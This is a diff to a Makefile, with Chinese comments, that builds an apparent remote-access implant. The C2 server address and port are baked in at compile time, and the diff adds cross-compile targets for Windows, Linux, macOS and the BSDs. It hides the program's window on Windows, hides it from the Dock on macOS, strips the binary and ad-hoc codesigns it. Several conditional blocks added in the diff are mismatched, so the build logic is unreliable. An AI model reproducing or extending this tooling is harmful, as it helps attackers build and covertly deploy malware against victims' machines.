@@ -51,6 +51,7 @@ endif
 all: $(SRC)
 ifeq ($(OS),Windows_NT) # Windows
 	$(eval $(call wininput))
+	@echo "如果你用的是MSYS/MSYS2等等会进入cmd，请输入exit退出"
 	@cmd $(P)/c erase $(P)/f $(P)/q .\.nn .\nn
 ifneq ($(findstring Microsoft,$(shell $(CC) /? 2>&1)),) # Microsoft Visual Studio (MSVC) !这里作者未测试过，可能需要调整
 	$(CC) $(SRC) /Fe:$(BIN).exe /O1 /DNDEBUG /DC2_IP=\"$(C2_IP)\" /DC2_PORT=$(C2_PORT) /link /subsystem:windows ws2_32.lib
@@ -72,11 +73,18 @@ endif
 ifeq ($(shell uname -s),Linux) # Linux
 	$(eval $(call uninput))
 	@sh -c "rm -rf ./nn ./.nn"
-	$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
-endif
+	ifeq ($(findstring w64-mingw32,$(CC)),w64-mingw32) # Linux的mingw编译器
+		$(CC) $(SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP="$(C2_IP)" -DC2_PORT=$(C2_PORT)
+	else # 普通linux编译
+	$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP="$(C2_IP)" -DC2_PORT=$(C2_PORT)
+	endif
 ifeq ($(findstring Darwin,$(shell uname -s)),Darwin) # macOS(Darwin)
 	$(eval $(call uninput))
 	@sh -c "rm -rf ./nn ./.nn"
+		ifeq ($(findstring w64-mingw32,$(CC)),w64-mingw32) # macOS(Darwin)的mingw编译器
+		$(CC) $(SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP="$(C2_IP)" -DC2_PORT=$(C2_PORT)
+		endif
+	else # 普通macOS(Darwin)编译
 	@printf '<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict><key>LSUIElement</key><true/></dict></plist>' > temp.plist
 	
 	@printf '#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <libgen.h>\n#include <mach-o/dyld.h>\n\
@@ -97,11 +105,30 @@ ifeq ($(findstring Darwin,$(shell uname -s)),Darwin) # macOS(Darwin)
 	@strip $(BIN) 2>/dev/null || true
 	@codesign -s - --force $(BIN) 2>/dev/null || true
 endif
-ifeq ($(shell uname -s),BSD) # BSD
-		$(eval $(call uninput))
+ifeq ($(findstring BSD,$(shell uname -s)),BSD) # BSD
+	$(eval $(call uninput))
 	@sh -c "rm -rf ./nn ./.nn"
-	$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP=\"$(C2_IP)\" -DC2_PORT=$(C2_PORT)
-endif
+ifeq ($(findstring FreeBSD,$(shell uname -s)),FreeBSD) # FreeBSD
+		ifeq ($(findstring w64-mingw32,$(CC)),w64-mingw32) # FreeBSD的mingw编译器
+		$(CC) $(SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP="$(C2_IP)" -DC2_PORT=$(C2_PORT)
+		else # 普通FreeBSD编译
+		$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP="$(C2_IP)" -DC2_PORT=$(C2_PORT)
+		endif
+	endif
+ifeq ($(findstring OpenBSD,$(shell uname -s)),OpenBSD) # OpenBSD
+		ifeq ($(findstring w64-mingw32,$(CC)),w64-mingw32) # OpenBSD的mingw编译器
+		$(CC) $(SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP="$(C2_IP)" -DC2_PORT=$(C2_PORT)
+		else # 普通OpenBSD编译
+		$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP="$(C2_IP)" -DC2_PORT=$(C2_PORT)
+		endif
+	endif
+ifeq ($(findstring NetBSD,$(shell uname -s)),NetBSD) # NetBSD
+		ifeq ($(findstring w64-mingw32,$(CC)),w64-mingw32) # NetBSD的mingw编译器
+		$(CC) $(SRC) -o $(BIN) -Os -s -lws2_32 -mwindows -DC2_IP="$(C2_IP)" -DC2_PORT=$(C2_PORT)
+		else # 普通NetBSD编译
+		$(CC) $(SRC) -o $(BIN) -Os -s -lpthread -DC2_IP="$(C2_IP)" -DC2_PORT=$(C2_PORT)
+		endif
+	endif
 
 
 clean:
